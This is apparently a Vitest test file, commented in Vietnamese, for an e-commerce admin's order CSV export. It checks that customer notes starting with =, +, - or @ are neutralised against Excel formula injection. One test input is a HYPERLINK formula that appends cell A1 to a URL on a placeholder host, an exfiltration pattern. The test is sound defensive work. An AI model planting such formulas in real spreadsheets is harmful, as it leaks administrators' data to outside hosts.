import { describe, it, expect } from 'vitest';
import { generateOrdersCsvString } from './export-csv';
import type { AdminOrder } from './admin-client';

const order = (over: Partial<AdminOrder> = {}): AdminOrder =>
  ({
    id: 'o1',
    code: 'TUBU1',
    status: 'CONFIRMED',
    paymentMethod: 'COD',
    total: 100000,
    createdAt: '2026-09-12T00:00:00.000Z',
    note: null,
    ...over,
  }) as unknown as AdminOrder;

/**
 * Ghi chú đơn hàng do KHÁCH tự nhập, còn file CSV thì quản trị viên mở bằng Excel. Không vô hiệu
 * hoá công thức thì đây là đường chạy mã trên máy quản trị viên.
 */
describe('generateOrdersCsvString — không để Excel chạy công thức từ ghi chú của khách', () => {
  it('ghi chú bắt đầu bằng "=" được thêm dấu nháy đơn', () => {
    const csv = generateOrdersCsvString([order({ note: '=HYPERLINK("https://x/?d="&A1,"Click")' })]);
    expect(csv).toContain(`'=HYPERLINK`);
  });

  it('các ký tự mở đầu nguy hiểm khác cũng bị vô hiệu hoá', () => {
    for (const raw of ['+1+1', '-2+3', '@SUM(A1)']) {
      const csv = generateOrdersCsvString([order({ note: raw })]);
      expect(csv).toContain(`'${raw}`);
    }
  });

  it('ghi chú bình thường giữ nguyên, không thêm ký tự lạ', () => {
    const csv = generateOrdersCsvString([order({ note: 'Giao giờ hành chính' })]);
    expect(csv).toContain('Giao giờ hành chính');
    expect(csv).not.toContain("'Giao");
  });

  it('vẫn bọc ngoặc kép khi có dấu phẩy (giữ nguyên hành vi cũ)', () => {
    const csv = generateOrdersCsvString([order({ note: 'Gọi trước, giao chiều' })]);
    expect(csv).toContain('"Gọi trước, giao chiều"');
  });
});
